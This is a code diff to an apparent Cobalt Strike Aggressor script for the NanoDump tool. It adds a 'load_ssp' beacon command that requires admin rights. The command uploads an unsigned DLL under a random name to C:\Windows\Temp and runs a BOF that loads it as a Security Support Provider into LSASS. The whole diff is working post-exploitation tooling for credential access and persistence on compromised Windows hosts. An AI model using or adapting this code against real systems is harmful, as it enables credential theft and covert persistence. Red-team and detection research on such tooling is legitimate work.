@@ -200,3 +200,73 @@ alias nanodump {
     btask($1, "Running NanoDump BOF");
     beacon_inline_execute($1, $bof, "go", $args);
 }
+
+beacon_command_register(
+"load_ssp",
+"Load a Security Support Provider (SSP) into LSASS.",
+"Usage: load_ssp [<SSP path>]");
+alias load_ssp {
+    local('$barch $handle $bof $exe $args $ssp_path');
+
+    $barch = barch($1);
+    if($barch eq "x86")
+    {
+        berror($1, "Nanodump does not support x86");
+        return;
+    }
+
+    ## make sure the beacon is not WoW64
+    #$barch = barch($1);
+    #$is64 = binfo($1, "is64");
+    #if($barch eq "x86" && $is64 == 1)
+    #{
+    #    berror($1, "Nanodump does not support WoW64");
+    #    return;
+    #}
+
+    # loading an SSP requires elevated privileges
+    if(!-isadmin $1)
+    {
+        berror($1, "You need to be admin to load an SSP.");
+        return;
+    }
+
+    # read in the BOF file
+    $handle = openf(script_resource("compiled/load_ssp." . $barch . ".o"));
+    $bof = readb($handle, -1);
+    closef($handle);
+    if(strlen($bof) == 0)
+    {
+        berror($1, "could not read bof file");
+        return;
+    }
+
+    if (size(@_) == 2)
+    {
+        $ssp_path = $2;
+    }
+    else
+    {
+        $folder = "C:\\Windows\\Temp";
+        $ssp_path = $folder . "\\" .  generate_rand_string(5, 10) . ".dll";
+        blog($1, "[!] An unsigned nanodump DLL will be uploaded to: ". $ssp_path);
+        # read in the DLL file
+        $handle = openf(script_resource("compiled/nanodump_ssp." . $barch . ".dll"));
+        $exe = readb($handle, -1);
+        closef($handle);
+        if(strlen($exe) == 0)
+        {
+            berror($1, "could not read DLL file");
+            return;
+        }
+        # upload the nanodump binary
+        bupload_raw($1, $ssp_path, $exe);
+    }
+
+    # pack the arguments
+    $args = bof_pack($1, "z", $ssp_path);
+
+    # run
+    btask($1, "Running load_ssp BOF");
+    beacon_inline_execute($1, $bof, "go", $args);
+}
